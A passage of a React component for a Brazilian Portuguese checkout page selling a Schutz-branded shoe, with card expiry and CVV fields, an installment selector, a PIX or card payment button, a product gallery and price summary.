                          <label className="block text-[11px] font-bold uppercase tracking-wider text-gray-600 mb-1">
                            Validade (MM/AA)
                          </label>
                          <input
                            type="text"
                            placeholder="MM/AA"
                            value={card.expiry}
                            onChange={(e) => setCard({ ...card, expiry: maskExpiry(e.target.value) })}
                            className="w-full rounded-xl border border-gray-300 bg-gray-50 px-3.5 py-2.5 text-xs text-gray-900 outline-none focus:bg-white focus:border-black focus:ring-1 focus:ring-black font-mono text-center"
                          />
                        </div>
                        <div>
                          <label className="block text-[11px] font-bold uppercase tracking-wider text-gray-600 mb-1">
                            CVV
                          </label>
                          <input
                            type="password"
                            placeholder="123"
                            maxLength={4}
                            value={card.cvv}
                            onChange={(e) => setCard({ ...card, cvv: onlyDigits(e.target.value) })}
                            className="w-full rounded-xl border border-gray-300 bg-gray-50 px-3.5 py-2.5 text-xs text-gray-900 outline-none focus:bg-white focus:border-black focus:ring-1 focus:ring-black font-mono text-center"
                          />
                        </div>
                      </div>

                      <div>
                        <label className="block text-[11px] font-bold uppercase tracking-wider text-gray-600 mb-1">
                          Parcelamento
                        </label>
                        <select
                          value={card.installments}
                          onChange={(e) => setCard({ ...card, installments: Number(e.target.value) })}
                          className="w-full rounded-xl border border-gray-300 bg-gray-50 px-3.5 py-2.5 text-xs text-gray-900 outline-none focus:bg-white focus:border-black focus:ring-1 focus:ring-black font-medium"
                        >
                          <option value={1}>1x de {brl(CARD_PRICE_CENTS)} sem juros</option>
                          <option value={2}>2x de {brl(CARD_PRICE_CENTS / 2)} sem juros</option>
                          <option value={3}>3x de {brl(CARD_PRICE_CENTS / 3)} sem juros</option>
                          <option value={4}>4x de {brl(CARD_PRICE_CENTS / 4)} sem juros</option>
                          <option value={5}>5x de {brl(CARD_PRICE_CENTS / 5)} sem juros</option>
                          <option value={6}>6x de {brl(CARD_PRICE_CENTS / 6)} sem juros</option>
                        </select>
                      </div>
                    </div>
                  )}

                  {error && (
                    <div className="flex items-center gap-2 p-3 bg-rose-50 border border-rose-200 text-rose-700 text-xs rounded-xl font-bold">
                      <AlertCircle size={16} className="shrink-0" />
                      <span>{error}</span>
                    </div>
                  )}

                  {/* FINAL SUBMIT BUTTON */}
                  <button
                    type="submit"
                    disabled={loading}
                    className="w-full bg-black hover:bg-gray-900 active:scale-[0.99] disabled:opacity-50 text-white font-black py-4 rounded-xl text-sm uppercase tracking-widest transition-all shadow-lg flex items-center justify-center gap-2 mt-4"
                  >
                    {loading ? (
                      <>
                        <span className="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin" />
                        <span>Processando Pedido...</span>
                      </>
                    ) : (
                      <>
                        <Lock size={16} />
                        <span>
                          {method === "pix" ? `Gerar PIX • ${brl(PIX_PRICE_CENTS)}` : `Pagar com Cartão • ${brl(CARD_PRICE_CENTS)}`}
                        </span>
                      </>
                    )}
                  </button>

                  <div className="pt-2 flex items-center justify-center">
                    <img
                      src={paymentBadgesImg}
                      alt="Bandeiras de pagamento"
                      className="h-6 w-auto object-contain opacity-80"
                    />
                  </div>
                </section>
              </form>
            </div>

            {/* RIGHT COLUMN: PRODUCT SHOWCASE SIDEBAR (5 cols) */}
            <div className="lg:col-span-5 space-y-5 sticky top-24">
              <div className="bg-white rounded-2xl border border-gray-200 shadow-xs overflow-hidden">
                {/* GALLERY */}
                <div className="relative aspect-square bg-gray-50">
                  <img
                    src={currentColor.images[activeImageIdx] || currentColor.images[0]}
                    alt={PRODUCT_NAME}
                    className="w-full h-full object-cover"
                  />
                  <div className="absolute top-3 left-3 bg-black/80 backdrop-blur-md text-white text-[10px] font-black uppercase px-2.5 py-1 rounded-full tracking-wider">
                    Edição Schutz
                  </div>
                </div>

                {/* THUMBNAILS */}
                {currentColor.images.length > 1 && (
                  <div className="p-3 bg-gray-50/50 border-t border-gray-100 flex gap-2">
                    {currentColor.images.map((img, idx) => (
                      <button
                        key={idx}
                        type="button"
                        onClick={() => setActiveImageIdx(idx)}
                        className={`w-14 h-14 rounded-lg overflow-hidden border transition-all ${
                          activeImageIdx === idx ? "border-black ring-2 ring-black" : "border-gray-200 opacity-60 hover:opacity-100"
                        }`}
                      >
                        <img src={img} alt="Miniatura" className="w-full h-full object-cover" />
                      </button>
                    ))}
                  </div>
                )}

                {/* SUMMARY DETAILS */}
                <div className="p-5 space-y-4">
                  <div>
                    <h2 className="text-base font-black uppercase tracking-tight text-gray-900">
                      {PRODUCT_NAME}
                    </h2>
                    <p className="text-xs text-gray-500 mt-0.5">
                      Cor: <strong>{currentColor.name}</strong> • Tam: <strong>{selectedSize} BR</strong>
                    </p>
                  </div>

                  <div className="border-t border-b border-gray-100 py-3 flex items-baseline justify-between">
                    <div>
                      <span className="text-xs text-gray-400 line-through mr-2">
                        {brl(OLD_PRICE_CENTS)}
                      </span>
                      <span className="text-xl font-black text-gray-900">
                        {method === "pix" ? brl(PIX_PRICE_CENTS) : brl(CARD_PRICE_CENTS)}
                      </span>
                    </div>
                    <span className="text-[11px] font-bold text-emerald-600 bg-emerald-50 px-2 py-0.5 rounded">
                      Economia de R$ 140,00
                    </span>
                  </div>

                  <ul className="text-xs text-gray-600 space-y-2">
                    <li className="flex items-center gap-2">
                      <Check size={14} className="text-[#00873e]" />
                      <span>Material Ultra Soft com toque aveludado</span>
                    </li>
                    <li className="flex items-center gap-2">
                      <Check size={14} className="text-[#00873e]" />
                      <span>Salto bloco ergonômico anti-impacto (5cm)</span>
                    </li>
                    <li className="flex items-center gap-2">
                      <Check size={14} className="text-[#00873e]" />
                      <span>Garantia total de 30 dias com troca grátis</span>
                    </li>
                    <li className="flex items-center gap-2">
                      <Check size={14} className="text-[#00873e]" />
                      <span>Envio com seguro e código de rastreio</span>
                    </li>
                  </ul>
                </div>
              </div>

              {/* SECURITY CARD */}
              <div className="bg-gray-100/80 rounded-2xl p-4 border border-gray-200 text-xs text-gray-600 space-y-2">
                <div className="flex items-center gap-2 font-bold text-gray-900">
                  <ShieldCheck size={16} className="text-[#00873e]" />
                  <span>Compra 100% Protegida Schutz</span>
                </div>
                <p className="text-[11px] text-gray-500 leading-relaxed">
                  Seus dados são criptografados com certificado SSL de 256 bits. O pagamento é processado diretamente pelo gateway oficial com total segurança.
                </p>
              </div>
            </div>
          </div>
        )}
      </main>
    </div>
  );
}
